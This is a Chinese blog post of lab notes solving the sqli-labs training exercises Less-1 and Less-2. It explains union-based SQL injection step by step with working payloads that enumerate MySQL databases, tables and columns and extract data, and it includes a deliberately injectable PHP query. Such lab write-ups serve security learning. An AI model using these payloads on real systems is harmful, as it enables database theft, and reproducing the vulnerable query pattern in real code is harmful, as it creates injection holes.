<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqli-lab通关笔记 | Quuiieet's Blog</title><meta name="author" content="Quuiieet"><meta name="copyright" content="Quuiieet"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="MySQL数据结构对于mysql数据库5.0以上版本的自带的数据库information_schema 下面有两个表：tables和columns。 tables  table_name字段下：所有数据库存在的表名 table_schema字段下：所有表名对应的数据库名  columns  column_name字段下是所有数据库存在的字段名 columns_schema字段下是所有表名对应的数据">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-lab通关笔记">
<meta property="og:url" content="http://holybeagle.github.io/2024/07/09/2024-07-09-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Quuiieet's Blog">
<meta property="og:description" content="MySQL数据结构对于mysql数据库5.0以上版本的自带的数据库information_schema 下面有两个表：tables和columns。 tables  table_name字段下：所有数据库存在的表名 table_schema字段下：所有表名对应的数据库名  columns  column_name字段下是所有数据库存在的字段名 columns_schema字段下是所有表名对应的数据">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2024-07-08T16:00:00.000Z">
<meta property="article:modified_time" content="2024-07-12T14:54:45.582Z">
<meta property="article:author" content="Quuiieet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://holybeagle.github.io/2024/07/09/2024-07-09-sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'sqli-lab通关笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-12 22:54:45'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Quuiieet's Blog"><span class="site-name">Quuiieet's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sqli-lab通关笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-08T16:00:00.000Z" title="发表于 2024-07-09 00:00:00">2024-07-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-12T14:54:45.582Z" title="更新于 2024-07-12 22:54:45">2024-07-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>26分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sqli-lab通关笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="MySQL数据结构"><a href="#MySQL数据结构" class="headerlink" title="MySQL数据结构"></a>MySQL数据结构</h2><p>对于mysql数据库5.0以上版本的自带的数据库<code>information_schema</code></p>
<p>下面有两个表：<code>tables</code>和<code>columns</code>。</p>
<p><code>tables</code></p>
<ul>
<li><code>table_name</code>字段下：所有数据库存在的<strong>表名</strong></li>
<li><code>table_schema</code>字段下：所有表名对应的数据库名</li>
</ul>
<p><code>columns</code></p>
<ul>
<li><code>column_name</code>字段下是所有数据库存在的字段名</li>
<li><code>columns_schema</code>字段下是所有表名对应的数据库</li>
</ul>
<h1 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h1><h2 id="Error-based"><a href="#Error-based" class="headerlink" title="Error based"></a>Error based</h2><h3 id="Less-1-single-quote"><a href="#Less-1-single-quote" class="headerlink" title="Less-1 single quote"></a>Less-1 <em>single quote</em></h3><ol>
<li><p>判断是否存在注入</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' -- a</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709201624531.png" alt="image-20240709201624531"></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and 1=2 -- a</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709201712920.png" alt="image-20240709201712920"></p>
<p>通过页面回显可判断：字符型注入。</p>
</li>
<li><p>联合注入 判断字段长度</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' order by 3 -- a</span></span><br></pre></td></tr></tbody></table></figure>

<p>试到<code>order by 4</code>时出现报错，即共有3列。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709224540888.png" alt="image-20240709224540888"></p>
<p><strong>补充内容：SQL Union</strong></p>
<blockquote>
<p>SQL Union用于将多个select结果集进行合并。值得注意的是，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
</blockquote>
<p>例：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">表A						表B</span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+		+----+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> content <span class="operator">|</span>		<span class="operator">|</span> id <span class="operator">|</span> content <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+		+----+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>    A    <span class="operator">|</span>		<span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>    B    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+		+----+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>    B    <span class="operator">|</span>		<span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>    C    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+		+----+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>    C    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+</span></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B;</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> content <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>    A    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>    B    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>    C    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>    B    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+---------+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>(<span class="number">2</span>,C)内容重复，只显示一条。</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><p>判断显错位</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,2,3 -- a</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240711162203648.png" alt="image-20240711162203648"></p>
<p>可以看到name在第2列，password在第3列，可以从第2列或者第3列查询出数据库名称</p>
</li>
<li><p>判断库名：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1 , database(),3 -- a</span></span><br></pre></td></tr></tbody></table></figure>

<p>或联合注入爆出<strong>全部库名</strong>（推荐）</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712162312551.png" alt="image-20240712162312551"></p>
<p>爆出库名：<code>ctftraining</code>,<code>information_schema</code>,<code>mysql</code>,<code>performance_schema</code>,<code>security</code>,<code>test</code></p>
</li>
<li><p>判断表名：<code>table_name</code></p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,table_name,3 from information_schema.tables where table_schema='</span>security<span class="string">' -- a </span></span><br></pre></td></tr></tbody></table></figure>

<p>或直接查询出该数据库中<strong>所有的表</strong>（推荐）：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= '</span>ctftraining<span class="string">'),3--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><code>group_concat()</code>：将查询到的结果连接起来。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712162138915.png" alt="image-20240712162138915"></p>
<p>爆出<code>ctftraining</code>库中的表名：<code>flag</code>,<code>news</code>,<code>users</code></p>
</li>
<li><p>判断列名：<code>column_name</code></p>
<p>查询出该数据库中所有的列</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>flag<span class="string">'--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>注：<code>table_name</code>字段不只存在于<code>tables</code>表，也存在<code>columns</code>表中，表示<strong>所有字段对应的表名</strong>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712162757783.png" alt="image-20240712162757783"></p>
<p>爆出表<code>flag</code>中的列名：<code>flag</code></p>
</li>
<li><p>判断数据：</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">' and 1=2 union select 1,2,group_concat(flag) from ctftraining.flag--+</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712163019645.png" alt="image-20240712163019645"></p>
<p>爆出数据，拿到flag。</p>
<h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>( <span class="string">' 127.0.0.1'</span> , <span class="string">' root '</span> , <span class="string">' root '</span> , <span class="string">'test '</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>( <span class="variable">$conn</span>, <span class="string">"select username from users where id="</span>.<span class="variable">$_GET</span>[ <span class="string">'id'</span> ]);</span><br><span class="line"><span class="comment">//代码用于根据用户输入的id查询用户的信息。用户的输入id字段没有任何过滤地被直接拼接在了sql查询语句中。由于id没有被引号包裹，而且类型为数字，我们称这种注入为数字型注入。</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>( <span class="string">' 127.0.0.1'</span> , <span class="string">' root '</span> , <span class="string">' root '</span> , <span class="string">'test '</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>( <span class="variable">$conn</span>, <span class="string">"select username from users where id="</span>.<span class="variable">$_GET</span>[ <span class="string">'id'</span> ]);<span class="variable">$row</span>= <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$res</span> );</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$row</span>[ <span class="string">' username '</span> ] );</span><br><span class="line"><span class="variable">$row</span>= <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$res</span> );</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$row</span>[ <span class="string">' username '</span> ] );</span><br></pre></td></tr></tbody></table></figure>

<p>测试注入存在：使用减法语句测试，如传参<code>id=1</code>、<code>id=2-1</code>、<code>id=3-1</code>的结果差异</p>
<h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><p>将两个select语句结果合并到一个结果集中，要求两个select语句拥有相同列数</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> password <span class="keyword">from</span> users</span><br></pre></td></tr></tbody></table></figure>

<p>由于没有id为0的列，所以第一个select的结果为空，第二个select语句查询了users表中的password列，所以最后的查询结果就是users表中password列的第一行。如果需要查询其他行，还需要使用limit关键字进行选择。</p>
<h3 id="Less-2-Intiger-Based"><a href="#Less-2-Intiger-Based" class="headerlink" title="Less-2 Intiger Based"></a>Less-2 <em>Intiger Based</em></h3><h5 id="判断注入、字段长度、显错位"><a href="#判断注入、字段长度、显错位" class="headerlink" title="判断注入、字段长度、显错位"></a>判断注入、字段长度、显错位</h5><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>  正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>"  报错 ' " LIMIT <span class="number">0</span>,<span class="number">1</span> <span class="string">'</span></span><br><span class="line"><span class="string">?id=1--+  正常  //数字型</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Less-2/?id=1 order by 3//回显位三个</span></span><br></pre></td></tr></tbody></table></figure>

<h5 id="联合注入爆出库名："><a href="#联合注入爆出库名：" class="headerlink" title="联合注入爆出库名："></a>联合注入爆出库名：</h5><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata<span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712163322852.png" alt="image-20240712163322852"></p>
<p>爆出库名：<code>ctftraining</code>,<code>information_schema</code>,<code>mysql</code>,<code>performance_schema</code>,<code>security</code>,<code>test</code></p>
<h5 id="联合注入爆出表名："><a href="#联合注入爆出表名：" class="headerlink" title="联合注入爆出表名："></a>联合注入爆出表名：</h5><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'ctftraining'</span><span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712163513605.png" alt="image-20240712163513605"></p>
<p>爆出<code>ctftraining</code>库中的表名：<code>flag</code>,<code>news</code>,<code>users</code>。</p>
<h5 id="联合注入爆出列名："><a href="#联合注入爆出列名：" class="headerlink" title="联合注入爆出列名："></a>联合注入爆出列名：</h5><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">'flag'</span><span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712163731930.png" alt="image-20240712163731930"></p>
<p>爆出表<code>flag</code>中的列有：<code>flag</code></p>
<h5 id="爆出数据"><a href="#爆出数据" class="headerlink" title="爆出数据"></a>爆出数据</h5><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Less<span class="number">-2</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(flag) <span class="keyword">from</span> ctftraining.flag<span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240712164113125.png" alt="image-20240712164113125"></p>
<p>爆出数据，拿到flag。</p>
